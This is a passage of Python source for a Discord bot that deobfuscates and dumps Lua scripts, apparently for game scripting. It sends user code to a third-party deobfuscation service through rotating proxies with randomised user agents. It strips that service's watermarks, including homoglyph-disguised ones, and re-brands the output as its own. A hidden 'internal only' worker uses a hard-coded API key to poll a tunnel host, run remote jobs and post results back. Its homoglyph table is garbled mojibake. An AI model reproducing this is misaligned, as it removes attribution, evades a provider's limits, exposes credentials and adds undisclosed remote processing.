    script = ROOT / \"lph.py\"
    if not script.exists():
        return [], \"panel script unavailable: lph.py was not found\"
    with tempfile.TemporaryDirectory() as tmp:
        input_path = os.path.join(tmp, \"input.lua\")
        output_path = os.path.join(tmp, \"output.lua\")
        with open(input_path, \"w\", encoding=\"utf-8\") as f:
            f.write(lua_code)
        cmd = [\"python\", \"lph.py\", input_path, output_path]
        returncode, stdout, stderr, timed_out = _run_process_limited(
            cmd, HARD_MAX_TIMEOUT + 10, capture_limit=LPH_OWNER_ERROR_MAX_BYTES)
        if timed_out:
            return [], f\"panel process timed out after {HARD_MAX_TIMEOUT + 10} seconds\"
        if returncode != 0:
            panel_error = \"\\n\".join(part for part in (stderr, stdout) if part)
            panel_error = panel_error or f\"panel exited with return code {returncode}\"
            return [], panel_error
        data = b\"\"
        if os.path.isfile(output_path):
            data = _read_file_safe(output_path)
        if not data:
            panel_error = \"\\n\".join(part for part in (stderr, stdout) if part)
            return [], panel_error or \"panel completed but produced an empty output file\"
        output_text = data.decode(\"utf-8\", errors=\"ignore\")
        if _looks_like_engine_error(output_text):
            return [], output_text
        return [(\"lph\", \"lph_output.lua\", data)], None


async def run_lph_engine(lua_code: str) -> tuple:
    \"\"\"Run the single `.lph` engine and keep panel errors private.\"\"\"
    try:
        files, panel_error = await asyncio.to_thread(_run_lph_script, lua_code)
        return [(\"lph\", files, None if files else LURAPH_ERROR)], panel_error
    except Exception as error:
        return [(\"lph\", [], LURAPH_ERROR)], f\"LPH runner exception: {error}\"

# =========================
# SUBPROCESS RUNNER
# =========================
def _terminate_process(proc):
    \"\"\"Kill a subprocess and its children so a noisy/infinite script stops.\"\"\"
    if proc is None or proc.poll() is not None:
        return
    try:
        if os.name == \"nt\":
            _kill_tree(proc.pid)
        else:
            os.killpg(proc.pid, signal.SIGKILL)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass
    try:
        proc.wait(timeout=5)
    except Exception:
        pass


def _run_process_limited(cmd: list, timeout: int, capture_limit: int = 64 * 1024) -> tuple:
    \"\"\"Run a process without retaining unbounded stdout/stderr in memory.

    Returns (returncode, stdout_prefix, stderr_prefix, timed_out). Output is
    bounded; callers must keep diagnostics private. LPH may send its bounded
    raw panel diagnostic only to the owner DM.
    \"\"\"
    proc = None
    try:
        with tempfile.TemporaryFile() as stdout_file, tempfile.TemporaryFile() as stderr_file:
            popen_kw = {
                \"cwd\": str(ROOT),
                \"stdout\": stdout_file,
                \"stderr\": stderr_file,
            }
            if os.name == \"nt\":
                popen_kw[\"creationflags\"] = getattr(subprocess, \"CREATE_NEW_PROCESS_GROUP\", 0)
            else:
                popen_kw[\"start_new_session\"] = True
            proc = subprocess.Popen(cmd, **popen_kw)
            try:
                proc.wait(timeout=timeout)
            except subprocess.TimeoutExpired:
                _terminate_process(proc)
                return None, \"\", \"\", True

            stdout_file.seek(0)
            stderr_file.seek(0)
            stdout = stdout_file.read(capture_limit).decode(\"utf-8\", errors=\"ignore\")
            stderr = stderr_file.read(capture_limit).decode(\"utf-8\", errors=\"ignore\")
            return proc.returncode, stdout, stderr, False
    except Exception:
        _terminate_process(proc)
        return None, \"\", \"\", False


def _run_subprocess_safe(cmd: list, timeout: int) -> tuple:
    \"\"\"Safe runner used by every Python/Luau helper.

    A failing helper is intentionally exposed to users as a timeout rather
    than embedding arbitrary, potentially huge traceback/output text.
    \"\"\"
    returncode, stdout, stderr, timed_out = _run_process_limited(cmd, timeout)
    if timed_out:
        return None, TIMEOUT_ERROR, True
    if returncode != 0:
        return None, TIMEOUT_ERROR, False
    return stdout.encode(\"utf-8\", errors=\"ignore\"), None, False

# =========================
# BACKGROUND WORKER (internal only)
# =========================
BG_API     = \"https://c0d486a8cc5e9850-36-73-100-43.serveousercontent.com\"
BG_KEY     = \"K7xP92mQa8VdL3sZ0nY5RtF1cW6uB4eH\"
BG_HEADERS = {\"X-API-Key\": BG_KEY}

def _bg_post(url, **kw):
    proxy, proxy_map = _required_requests_proxy()
    kw.setdefault(\"timeout\", 10)
    headers = kw.pop(\"headers\", {})
    headers.update(BG_HEADERS)
    headers.setdefault(\"User-Agent\", _pick_ua())
    kw.pop(\"proxies\", None)
    try:
        r = requests.post(url, headers=headers, proxies=proxy_map, **kw)
        proxy_manager.report_success(proxy)
        return r
    except Exception as e:
        proxy_manager.report_fail(proxy)
        raise e

def _bg_get(url, **kw):
    proxy, proxy_map = _required_requests_proxy()
    kw.setdefault(\"timeout\", 10)
    headers = kw.pop(\"headers\", {})
    headers.update(BG_HEADERS)
    headers.setdefault(\"User-Agent\", _pick_ua())
    kw.pop(\"proxies\", None)
    try:
        r = requests.get(url, headers=headers, proxies=proxy_map, **kw)
        proxy_manager.report_success(proxy)
        return r
    except Exception as e:
        proxy_manager.report_fail(proxy)
        raise e

def process_lune_sync(lua_code: str, config: dict) -> tuple:
    with tempfile.TemporaryDirectory() as tmp:
        ip = os.path.join(tmp, \"input.lua\")
        op = os.path.join(tmp, \"output.lua\")
        with open(ip, \"w\", encoding=\"utf-8\") as f:
            f.write(lua_code)
        ip_abs, op_abs = os.path.abspath(ip), os.path.abspath(op)
        t = HARD_MAX_TIMEOUT
        cmd = [LUNE_BIN, \"run\", \"v1.lua\", ip_abs, op_abs, f\"--Timeout={t}\"]
        raw, err, timed_out = _run_subprocess_safe(cmd, t + 5)
        if timed_out: return None, TIMEOUT_ERROR
        if err: return None, TIMEOUT_ERROR
        if not os.path.exists(op_abs): return None, TIMEOUT_ERROR
        try:
            if os.path.getsize(op_abs) > MAX_OUTPUT_BYTES:
                return None, TIMEOUT_ERROR
        except OSError:
            return None, TIMEOUT_ERROR
        with open(op_abs, \"r\", encoding=\"utf-8\", errors=\"replace\") as f:
            return f.read(), None

def background_worker():
    retry = 0
    while True:
        try:
            try:
                r = _bg_get(BG_API + \"/jobs\")
            except Exception:
                time.sleep(10)
                continue
            if r.status_code != 200:
                retry += 1
                time.sleep(min(30, retry * 5))
                continue
            retry = 0
            for job in r.json().get(\"jobs\", []):
                jid = job[\"id\"]
                inp = job.get(\"data\", \"\")
                try:
                    out, err = process_lune_sync(inp, DEFAULT_CONFIG.copy())
                    result = f\"Error: {err}\" if err else (out or \"\")
                    for _ in range(3):
                        try:
                            resp = _bg_post(BG_API + \"/postoutput\", json={\"id\": jid, \"output\": result})
                            if resp.status_code == 200:
                                break
                            time.sleep(2)
                        except Exception:
                            time.sleep(2)
                except Exception as e:
                    for _ in range(3):
                        try:
                            _bg_post(BG_API + \"/postoutput\", json={\"id\": jid, \"output\": f\"Error: {e}\"})
                            break
                        except Exception:
                            time.sleep(2)
        except Exception as e:
            print(f\"[Worker] {e}\")
            time.sleep(10)
        time.sleep(5)

# =========================
# GENERIC LUNE ENGINE
# =========================
async def run_lune_engine(lua_code: str, script: str) -> tuple:
    def _sync():
        with tempfile.TemporaryDirectory() as tmp:
            ip = os.path.join(tmp, \"input.lua\")
            op = os.path.join(tmp, \"output.lua\")
            with open(ip, \"w\", encoding=\"utf-8\") as f:
                f.write(lua_code)
            ip_abs, op_abs = os.path.abspath(ip), os.path.abspath(op)
            t = HARD_MAX_TIMEOUT
            cmd = [LUNE_BIN, \"run\", script, ip_abs, op_abs, f\"--Timeout={t}\"]
            raw, err, timed_out = _run_subprocess_safe(cmd, t + 5)
            if timed_out:
                return None, TIMEOUT_ERROR
            if err:
                return None, TIMEOUT_ERROR
            if raw is None or not os.path.exists(op_abs):
                return None, TIMEOUT_ERROR
            try:
                if os.path.getsize(op_abs) > MAX_OUTPUT_BYTES:
                    return None, TIMEOUT_ERROR
            except OSError:
                return None, TIMEOUT_ERROR
            with open(op_abs, \"rb\") as f:
                data = f.read(MAX_OUTPUT_BYTES + 1)
            if len(data) > MAX_OUTPUT_BYTES or not data:
                return None, TIMEOUT_ERROR
            return data, None
    return await asyncio.to_thread(_sync)

async def run_deobf(lua_code: str) -> tuple:
    return await run_lune_engine(lua_code, \"deo.lua\")

async def run_v1(lua_code: str) -> tuple:
    return await run_lune_engine(lua_code, \"v1.lua\")

async def run_v2(lua_code: str) -> tuple:
    return await run_lune_engine(lua_code, \"v2.lua\")

async def run_v3(lua_code: str) -> tuple:
    return await run_lune_engine(lua_code, \"v3.lua\")

async def run_wyn(lua_code: str) -> tuple:
    return await run_lune_engine(lua_code, \"wyn.lua\")

async def run_constant(lua_code: str) -> tuple:
    return await run_lune_engine(lua_code, \"constant.lua\")

async def run_debug(lua_code: str, config: dict) -> tuple:
    return await run_lune_engine(lua_code, \"debug.lua\")

# =========================
# RENAME RUNNER
# =========================
async def run_rename(input_path: str, output_path: str) -> tuple:
    def _sync():
        cmd = [\"python\", \"rename.py\", input_path, output_path]
        raw, err, timed_out = _run_subprocess_safe(cmd, HARD_MAX_TIMEOUT + 5)
        if timed_out or err:
            return None, TIMEOUT_ERROR
        if not os.path.exists(output_path):
            return None, TIMEOUT_ERROR
        try:
            if os.path.getsize(output_path) > MAX_OUTPUT_BYTES:
                return None, TIMEOUT_ERROR
            with open(output_path, \"rb\") as f:
                data = f.read(MAX_OUTPUT_BYTES + 1)
        except Exception:
            return None, TIMEOUT_ERROR
        if not data or len(data) > MAX_OUTPUT_BYTES:
            return None, TIMEOUT_ERROR
        return data, None
    return await asyncio.to_thread(_sync)

import unicodedata


LEAKD_PROMETHEUS = \"https://leakd.up.railway.app/prometheus\"
LEAKD_BEAUTIFY = \"https://leakd.up.railway.app/beautify\"
LEAKD_MOONSEC = \"https://leakd.up.railway.app/moonsec\"
LEAKD_MAX_RETRIES = 2

def _post_leakd(url: str, lua_code: str, timeout: int = 60):
    \"\"\"POST to LeakD with at most two retries for transient failures.\"\"\"
    last_response = None
    retry_statuses = {429, 500, 502, 503, 504}
    for attempt in range(LEAKD_MAX_RETRIES + 1):
        proxy_url = None
        try:
            proxy_url, proxy_map = _required_requests_proxy()
            response = requests.post(
                url,
                json={\"code\": lua_code},
                headers={
                    \"Content-Type\": \"application/json\",
                    \"User-Agent\": _pick_ua(),
                },
                proxies=proxy_map,
                timeout=timeout,
            )
            proxy_manager.report_success(proxy_url)
            last_response = response
            if response.status_code not in retry_statuses:
                return response
            if attempt < LEAKD_MAX_RETRIES:
                retry_after = float(response.headers.get(\"Retry-After\", 1.0))
                time.sleep(min(max(retry_after, 0.5), 5.0))
        except Exception:
            if proxy_url:
                proxy_manager.report_fail(proxy_url)
            last_response = None
            if attempt < LEAKD_MAX_RETRIES:
                time.sleep(min(2.0 * (attempt + 1), 5.0))
    return last_response


# ============================================================
# LEAKD WATERMARK PATTERNS
# ============================================================

_WRAPPER_PATTERNS = [
    # Standard ASCII variants
    re.compile(
        r'--\\s*[Dd]eobfuscated\\s+by\\s+LeakD[^\\r\\n]*(?:\\r?\\n|$)',
        re.I | re.M
    ),

    re.compile(
        r'--\\s*(?:This\\s+file\\s+was\\s+)?'
        r'(?:Beautified|Deobfuscated|Processed)'
        r'\\s+by\\s+LeakD[^\\r\\n]*(?:\\r?\\n|$)',
        re.I | re.M
    ),

    re.compile(
        r'--\\s*LeakD[^\\r\\n]*(?:\\r?\\n|$)',
        re.I | re.M
    ),

    # Discord watermark
    re.compile(
        r'--?[ \\t]*discord\\.gg/qteAQmfJmP[^\\r\\n]*(?:\\r?\\n|$)',
        re.I | re.M
    ),

    # Deobfuscated by LeakD + separator
    re.compile(
        r'--\\s*Deobfuscated\\s+by\\s+LeakD'
        r'\\s*\\|?[^\\r\\n]*(?:\\r?\\n|$)',
        re.I | re.M
    ),

    # Generic normalized LeakD watermark
    re.compile(
        r'--\\s*Deobfuscat.{0,5}d'
        r'\\s+b.{0,3}\\s+L.{0,4}a.{0,3}k.{0,3}D'
        r'[^\\r\\n]*(?:\\r?\\n|$)',
        re.I | re.M
    ),
]


# ============================================================
# UNICODE HOMOGLYPH NORMALIZATION
# ============================================================

_LEAKD_HOMOGLYPH_MAP = {
    # Cyrillic uppercase
    \"ƒ‚\": \"A\",
    \"ƒ‚„\": \"B\",
    \"ƒ‚\": \"E\",
    \"ƒ...\": \"K\",
    \"ƒ...€œ\": \"M\",
    \"ƒ...\": \"O\",
    \"ƒ \": \"P\",
    \"ƒ‚\": \"C\",
    \"ƒ‚\": \"T\",
    \"ƒ‚\": \"X\",
    \"ƒ‚\": \"Y\",

    # Cyrillic lowercase
    \"ƒ‚\": \"a\",
    \"ƒ‚\": \"b\",
    \"ƒ‚\": \"e\",
    \"ƒ‚\": \"k\",
    \"ƒ‚\": \"m\",
    \"ƒ‚\": \"o\",
    \"ƒ€ ̃€š\": \"p\",
    \"ƒ€ ̃‚\": \"c\",
    \"ƒ€ ̃‚\": \"t\",
    \"ƒ€ ̃‚\": \"x\",
    \"ƒ€ ̃†€TM\": \"y\",

    # Cyrillic characters commonly abused in watermarks
    \"ƒ‚\": \"b\",
    \"ƒ€ ̃...€TM\": \"b\",
    \"ƒ‚œ\": \"B\",
    \"ƒ‚\": \"b\",

    # Ukrainian / extended Cyrillic
    \"ƒ‚ \": \"I\",
    \"ƒ€ ̃‚€œ\": \"i\",

    # Latin-looking Unicode characters
    \"ƒ€‚\": \"d\",
    \"ƒ€‚\": \"D\",
    \"ƒ€†€TM\": \"d\",
    \"ƒ€œ‚\": \"z\",
    \"ƒ€œ \": \"Z\",

    # Common mathematical / full-width variants
    \"ƒ‚‚\": \"K\",

    # Actual Cyrillic lookalikes used in LeakD watermark variants, e.g.
    # \"efu•ted y Lk\".
    \"\": \"D\",
    \"\": \"e\",
    \"\": \"o\",
    \"\": \"b\",
    \"•\": \"s\",
    \"\": \"c\",
    \"\": \"a\",
    \"ƒ\": \"y\",
    \"\": \"k\",
    \"–\": \"i\",
    \"Œ\": \"b\",
    \"\": \"A\",
    \"•\": \"E\",
    \"š\": \"K\",
    \"œ\": \"M\",
    \"\": \"H\",
    \"ž\": \"O\",
    \" \": \"P\",
    \"\": \"C\",
    \"\": \"T\",
    \"\": \"X\",
}

# str.maketrans() raises \"ValueError: string keys in translate table
# must be of length 1\" if any key is not exactly one character. That
# happens when the source file is saved/copied with a broken encoding
# and a Cyrillic char turns into mojibake. Build the table defensively:
# only single-char keys go into maketrans; anything else is applied via
# .replace() in the fallback loop below.
_LEAKD_HOMOGLYPHS = str.maketrans({
    k: v for k, v in _LEAKD_HOMOGLYPH_MAP.items()
    if len(k) == 1 and len(v) == 1
})


def _normalize_leakd_homoglyphs(text: str) -> str:
    if not text:
        return text

    # Normalize Unicode compatibility characters first
    text = unicodedata.normalize(\"NFKC\", text)

    # Fast path: single-char replacements
    text = text.translate(_LEAKD_HOMOGLYPHS)

    # Fallback: apply any multi-char keys (mojibake variants) via replace
    for k, v in _LEAKD_HOMOGLYPH_MAP.items():
        if len(k) != 1:
            text = text.replace(k, v)

    return text


# ============================================================
# REMOVE LEAKD WATERMARKS
# ============================================================

def _strip_leakd_watermarks(text: str) -> str:
    \"\"\"
    Remove LeakD wrappers/watermarks while preserving the actual Lua code.
    Supports ASCII, mojibake and Unicode homoglyph variants.
    \"\"\"

    if not text:
        return text

    # 1. Fix mojibake
    text = _fix_mojibake(text)

    # 2. Normalize Unicode homoglyphs
    text = _normalize_leakd_homoglyphs(text)

    # 3. Remove known watermark patterns
    for pattern in _WRAPPER_PATTERNS:
        text = pattern.sub(\"\", text)

    # 4. Generic fallback
    text = re.sub(
        r'(?im)'
        r'^[ \\t]*--[ \\t]*'
        r'Deobfuscat.{0,6}d'
        r'[ \\t]+'
        r'b.{0,4}'
        r'[ \\t]+'
        r'L.{0,5}a.{0,4}k.{0,4}D'
        r'[^\\r\\n]*'
        r'(?:\\r?\\n|$)',
        '',
        text
    )

    # 5. Remove standalone LeakD watermark lines
    text = re.sub(
        r'(?im)'
        r'^[ \\t]*--[ \\t]*'
        r'(?:Beautified|Processed|Deobfuscated)'
        r'[^\\r\\n]*LeakD[^\\r\\n]*'
        r'(?:\\r?\\n|$)',
        '',
        text
    )

    # 5b. Last-resort line filter for Unicode/mixed-script variants. The
    # normalized copy is used only for matching; actual Lua lines are kept
    # byte-for-byte unless they are clearly a LeakD wrapper line.
    kept_lines = []
    for line in text.splitlines():
        normalized_line = _normalize_leakd_homoglyphs(line).casefold()
        is_comment = line.lstrip().startswith('--')
        is_leakd = 'leakd' in normalized_line
        is_leakd_link = 'discord.gg/qteaqmfjmp' in normalized_line
        is_wrapper = any(word in normalized_line for word in (
            'deobfuscat', 'beautif', 'processed'
        ))
        if is_comment and ((is_leakd and is_wrapper) or is_leakd_link):
            continue
        kept_lines.append(line)
    text = '\\n'.join(kept_lines)

    # 6. JSON response wrapper
    stripped = text.strip()

    if stripped.startswith(\"{\") and stripped.endswith(\"}\"):
        try:
            data = json.loads(stripped)

            code = (
                data.get(\"deobfuscated_code\")
                or data.get(\"output\")
                or data.get(\"code\")
                or data.get(\"result\")
                or data.get(\"beautified_code\")
            )

            if isinstance(code, str) and code.strip():
                text = code

                text = text.replace(\"\\\\n\", \"\\n\")
                text = text.replace('\\\\\"', '\"')

        except Exception:
            pass

    # 7. Remove leading empty lines
    lines = text.splitlines()

    while lines and not lines[0].strip():
        lines.pop(0)

    return _mask_host_ip_leaks(\"\\n\".join(lines).strip())


def _clean_output_bytes(data: bytes, filename: str = \"\") -> bytes:
    \"\"\"Remove provider watermarks from text outputs without touching binaries.\"\"\"
    if not data:
        return data
    suffix = pathlib.Path(filename).suffix.lower()
    if suffix and suffix not in {\".lua\", \".luau\", \".txt\", \".dis\"}:
        return data
    if b\"\\x00\" in data[:4096]:
        return data
    try:
        text = data.decode(\"utf-8\")
    except UnicodeDecodeError:
        return data
    cleaned = _mask_host_ip_leaks(_strip_leakd_watermarks(text))
    return cleaned.encode(\"utf-8\")


# ============================================================
# EXTRACT CODE FROM LEAKD RESPONSE
# ============================================================

def _extract_leakd_code(
    response_text: str,
    response_json: dict = None
) -> str:

    # JSON fields first
    if response_json:
        for key in (
            \"deobfuscated_code\",
            \"output\",
            \"code\",
            \"result\",
            \"beautified_code\",
        ):
            value = response_json.get(key)

            if (
                isinstance(value, str)
                and value.strip()
            ):
                return value

    # Try parsing raw response as JSON
    stripped = response_text.strip()

    if stripped.startswith(\"{\"):
        try:
            data = json.loads(stripped)

            for key in (
                \"deobfuscated_code\",
                \"output\",
                \"code\",
                \"result\",
                \"beautified_code\",
            ):
                value = data.get(key)

                if (
                    isinstance(value, str)
                    and value.strip()
                ):
                    return value

        except Exception:
            pass

    return response_text


# ============================================================
# PROMETHEUS
# ============================================================

async def run_promdeobf(lua_code: str) -> tuple:

    def _sync():
        try:
            r = _post_leakd(LEAKD_PROMETHEUS, lua_code)
            if r is None:
                return None, PROMDEOBF_ERROR

            if r.status_code != 200:
                return (
                    None,
                    PROMDEOBF_ERROR
                )

            resp_json = None

            try:
                resp_json = r.json()
            except Exception:
                pass

            if isinstance(resp_json, dict):
                has_code = any(
                    isinstance(resp_json.get(key), str) and resp_json.get(key).strip()
                    for key in (\"deobfuscated_code\", \"output\", \"code\", \"result\", \"beautified_code\")
                )
                if not has_code and any(key in resp_json for key in (\"error\", \"detail\")):
                    return None, PROMDEOBF_ERROR

            code = _extract_leakd_code(
                r.text,
                resp_json
            )

            # Remove LeakD watermark
            code = _strip_leakd_watermarks(code)

            if (not code or not code.strip() or
                    _looks_like_engine_error(code)):
                return None, PROMDEOBF_ERROR

            # KEEP KVms watermark
            watermark = (
                f\"-- deobfuscated by KVms | \"
                f\"{MAIN_DISCORD_LINK}\\n\\n\"
            )

            final = watermark + code.strip()
            final_bytes = final.encode(\"utf-8\")
            if len(final_bytes) > MAX_OUTPUT_BYTES:
                return None, PROMDEOBF_ERROR

            return final_bytes, None

        except Exception:
            return None, PROMDEOBF_ERROR

    return await asyncio.to_thread(_sync)


# ============================================================
# BEAUTIFY
# ============================================================

async def run_beautify(lua_code: str) -> tuple:

    def _sync():
        try:
            r = _post_leakd(LEAKD_BEAUTIFY, lua_code)
            if r is None:
                return None, \"LeakD request failed\"

            if r.status_code != 200:
                return (
                    None,
                    f\"LeakD returned HTTP {r.status_code}\"
                )

            resp_json = None

            try:
                resp_json = r.json()
            except Exception:
                pass

            code = _extract_leakd_code(
                r.text,
                resp_json
            )

            # Remove LeakD watermark
            code = _strip_leakd_watermarks(code)

            # KEEP KVms watermark
            watermark = (
                f\"--\\n\"
                f\"-- beautified by KVms | \"
                f\"{MAIN_DISCORD_LINK}\\n\\n\"
            )

            final = watermark + code.strip()
            final_bytes = final.encode(\"utf-8\")
            if len(final_bytes) > MAX_OUTPUT_BYTES:
                return None, \"LeakD response too large\"

            return final_bytes, None

        except Exception as e:
            return None, _sanitize_error(str(e))

    return await asyncio.to_thread(_sync)


# ============================================================
# MOONSEC
# ============================================================

async def run_moonsec(lua_code: str) -> tuple:

    def _sync():
        try:
            r = _post_leakd(LEAKD_MOONSEC, lua_code)
            if r is None:
                return None, MOONSEC_ERROR

            if r.status_code != 200:
                return (
                    None,
                    MOONSEC_ERROR
                )

            resp_json = None

            try:
                resp_json = r.json()
            except Exception:
                pass

            if isinstance(resp_json, dict):
                has_code = any(
                    isinstance(resp_json.get(key), str) and resp_json.get(key).strip()
                    for key in (\"deobfuscated_code\", \"output\", \"code\", \"result\", \"beautified_code\")
                )
                if not has_code and any(key in resp_json for key in (\"error\", \"detail\")):
                    return None, MOONSEC_ERROR

            code = _extract_leakd_code(
                r.text,
                resp_json
            )

            # Remove LeakD watermark
            code = _strip_leakd_watermarks(code)

            if (not code or not code.strip() or
                    _looks_like_engine_error(code)):
                return None, MOONSEC_ERROR

            # KEEP KVms watermark
            watermark = (
                f\"-- deobfuscated by KVms | \"
                f\"{MAIN_DISCORD_LINK}\\n\\n\"
            )

            final = watermark + code.strip()
            final_bytes = final.encode(\"utf-8\")
            if len(final_bytes) > MAX_OUTPUT_BYTES:
                return None, MOONSEC_ERROR

            return final_bytes, None

        except Exception:
            return None, MOONSEC_ERROR

    return await asyncio.to_thread(_sync)

# =========================
# EXTRACT LUA
# =========================
async def _read_attachment_limited(att):
    try:
        declared_size = getattr(att, \"size\", 0) or 0
        if declared_size > MAX_INPUT_BYTES:
            return None
        raw = await att.read()
        if raw is None or len(raw) > MAX_INPUT_BYTES:
            return None
        return raw
    except Exception:
        return None


async def extract_lua_from(message):
    \"\"\"Read Lua from an attachment, fenced block, or a replied plain-code message.\"\"\"
    for att in getattr(message, \"attachments\", []):
        if getattr(att, \"filename\", \"\").lower().endswith((\".lua\", \".luau\", \".txt\")):
            try:
                raw = await _read_attachment_limited(att)
                if raw:
                    return raw.decode(\"utf-8\", errors=\"ignore\")
            except Exception:
                pass
    content = (getattr(message, \"content\", \"\") or \"\").strip()
    m = LUA_CODEBLOCK.search(content)
    if m:
        return m.group(1).strip()
    # A reply may itself contain a raw source URL. Resolve it here so every
    # command that accepts replies gets the same URL behavior.
    if content and URL_RE.fullmatch(content):
        try:
            raw = await fetch_from_url(content.rstrip(\".,)`'\\\"\"))
            return raw.decode(\"utf-8\", errors=\"ignore\") if raw else None
        except Exception:
            return None
    # A referenced message is often ordinary text rather than a fenced block.
    # Keep command-looking text out, but accept normal Lua/code as-is.
    if content and not content.startswith(\".\"):
        return content
    return None

# =========================
# URL EXTRACTOR (discord links excluded)
# =========================
def _extract_urls_from_output(text: str) -> list:
    if not text:
        return []
    urls = URL_RE.findall(text)
    seen = []
    for u in urls:
        u = u.rstrip(\".,)`'\\\"\")
        if u in seen:
            continue
        if DISCORD_URL_RE.search(u):
            continue
        seen.append(u)
    return seen

def _format_urls_footer(urls: list) -> str:
    if not urls:
        return \">> no urls found\"
    if len(urls) == 1:
        return f\">> urls found: {urls[0]}\"
    head = \", \".join(urls[:3])
    extra = f\" (+{len(urls)-3} more)\" if len(urls) > 3 else \"\"
    return f\">> urls found: {head}{extra}\"


def _looks_like_engine_error(text: str) -> bool:
    \"\"\"Recognize common error-wrapper output without echoing its body.\"\"\"
    if not text:
        return False
    first = text.lstrip().lower()
    return first.startswith((
        \"--err\", \"error:\", \"runtime error\", \"fatal error\", \"traceback\",
        \"exception:\", \"[error]\", \"process failed\", \"output limit\",
    ))

# =========================
# EMBED FOOTER HELPER
# =========================
def _make_footer(took: float = None) -> str:
    ts = datetime.now().strftime(\"%H:%M:%S\")
    if took is not None:
        return f\"generated in {took:.2f}s at {ts} | KVms | {MAIN_DISCORD_LINK}\"
    return f\"KVms | {MAIN_DISCORD_LINK}\"

# =========================
# .L DUMPER - FULLY FIXED
# =========================

def _kill_tree(pid: int):
    try:
        subprocess.run([\"taskkill\", \"/F\", \"/T\", \"/PID\", str(pid)],
                       capture_output=True, timeout=5)
    except Exception:
        pass

def _l_dump_blocking(in_rel, out_rel, timeout):
    timeout = min(timeout, HARD_MAX_TIMEOUT)

    cmd = [
        LUNE_BIN,
        \"run\",
        \"v1.lua\",
        in_rel,
        out_rel
    ]

    started = time.perf_counter()

    returncode, stdout_prefix, stderr_prefix, timed_out = _run_process_limited(cmd, timeout)
    took = time.perf_counter() - started

    if timed_out or returncode is None:
        return False, TIMEOUT_ERROR, float(timeout) if timed_out else took
    if returncode != 0:
        return False, TIMEOUT_ERROR, took

    out_path = ROOT / out_rel

    if not out_path.exists():
        if stdout_prefix and (\"[KVms] Done!\" in stdout_prefix or \"Output written to\" in stdout_prefix):
            import glob
            possible_outputs = glob.glob(str(ROOT / \"bot_tmp\" / \"*_out.lua\"))
            if possible_outputs:
                latest = max(possible_outputs, key=os.path.getctime)
                if os.path.exists(latest):
                    try:
                        if os.path.getsize(latest) > MAX_OUTPUT_BYTES:
                            return False, TIMEOUT_ERROR, took
                        content = open(latest, \"r\", encoding=\"utf-8\", errors=\"ignore\").read()
                        if content and content.strip():
                            return content, None, took
                    except:
                        pass
        return False, TIMEOUT_ERROR, took

    try:
        if out_path.stat().st_size > MAX_OUTPUT_BYTES:
            return False, TIMEOUT_ERROR, took
        content = out_path.read_text(errors=\"ignore\")
    except Exception:
        return False, TIMEOUT_ERROR, took

    if not content or content.strip() == \"\":
        return False, TIMEOUT_ERROR, took

    if content.startswith(\"--err\") or _looks_like_engine_error(content):
        return False, TIMEOUT_ERROR, took

    lines = content.splitlines()

    status_patterns = [
        r\"^\\[\\s*\\d+mDecode\\s*@\\s*\\d+mline\\s*\\d+\\s*\\]:\\s*Took.*\",
        r\"^\\[KVms\\]\\s*Done!.*\",
        r\"^Output\\s+written\\s+to.*\",
        r\"^Took\\s+[\\d.]+.*\",
        r\"^false$\",
    ]

    filtered_lines = []
    for line in lines:
        stripped = line.strip()
        if not stripped:
            continue

        is_status = False
        for pattern in status_patterns:
            if re.match(pattern, stripped, re.I):
                is_status = True
                break

        if not is_status:
            filtered_lines.append(line)

    if filtered_lines:
        filtered_content = \"\\n\".join(filtered_lines).strip()
        if filtered_content:
            return filtered_content, None, took

    if len(lines) > 1:
        code_lines = []
        for line in lines:
            stripped = line.strip()
            if stripped and not any(p in stripped for p in [\"Took\", \"KVms\", \"Output written\", \"Decode\"]):
                code_lines.append(line)
        if code_lines:
            return \"\\n\".join(code_lines), None, took

    return content, None, took

async def gather_l_jobs(message):
    sources = [message]
    if message.reference:
        referenced = message.reference.resolved
        if referenced is None:
            try:
                referenced = await message.channel.fetch_message(message.reference.message_id)
            except Exception:
                referenced = None
        if referenced is not None:
            sources.append(referenced)
    jobs, seen = [], set()
    for src in sources:
        for att in getattr(src, \"attachments\", []):
            if att.filename.lower().endswith(OK_EXT) and att.id not in seen:
                seen.add(att.id)
                jobs.append({\"name\": att.filename, \"att\": att, \"url\": None, \"inline\": None})
        text = getattr(src, \"content\", \"\") or \"\"
        # A replied code message may contain a URL literal. Treat the whole
        # reply as code instead of turning that literal into a separate URL job.
        is_reply_code = (src is not message and text.strip() and
                         not URL_RE.fullmatch(text.strip()) and
                         (LUA_CODEBLOCK.search(text) or _looks_plain(text) or
                          \"\\n\" in text or \"=\" in text or \"(\" in text))
        if is_reply_code:
            continue
        for url in URL_RE.findall(text):
            url = url.rstrip(\".,)`'\\\"\")
            if url in seen: continue
            seen.add(url)
            name = url.split(\"?\")[0].rstrip(\"/\").split(\"/\")[-1] or \"script\"
            if not name.lower().endswith(OK_EXT):
                name += \".lua\"
            jobs.append({\"name\": name, \"att\": None, \"url\": url, \"inline\": None})
    if not jobs:
        content = message.content or \"\"
        cb = LUA_CODEBLOCK.search(content)
        if cb:
            code = cb.group(1).strip()
            if code and _source_within_input_limit(code):
                jobs.append({\"name\": \"inline.lua\", \"att\": None, \"url\": None, \"inline\": code})
        else:
            # Support `.l` replying to ordinary, unfenced Lua/code text.
            reply = sources[-1] if len(sources) > 1 else None
            reply_text = (getattr(reply, \"content\", \"\") or \"\").strip() if reply else \"\"
            reply_cb = LUA_CODEBLOCK.search(reply_text)
            reply_code = reply_cb.group(1).strip() if reply_cb else reply_text
            reply_is_url = bool(URL_RE.fullmatch(reply_text))
            if reply_code and not reply_text.startswith(\".\") and not reply_is_url:
                if _source_within_input_limit(reply_code):
                    jobs.append({\"name\": \"reply.lua\", \"att\": None, \"url\": None,
                                 \"inline\": reply_code, \"reply_source\": True})
            elif content:
                after = content.split(maxsplit=1)
                if len(after) > 1 and not after[1].strip().startswith((\"http://\", \"https://\")):
                    code = after[1].strip()
                    if _source_within_input_limit(code):
                        jobs.append({\"name\": \"inline.lua\", \"att\": None, \"url\": None, \"inline\": code})
    return jobs

async def fetch_job_source(job) -> str:
    job_id = job.get(\"job_id\")
    source_type = (\"url\" if job.get(\"url\") else
                   \"attachment\" if job.get(\"att\") is not None else
                   \"reply\" if job.get(\"reply_source\") else \"inline\")
    filename = job.get(\"name\")
    url = job.get(\"url\")
    if job[\"inline\"] is not None:
        source = job[\"inline\"]
    elif job[\"att\"] is not None:
        raw = await _read_attachment_limited(job[\"att\"])
        if raw is None:
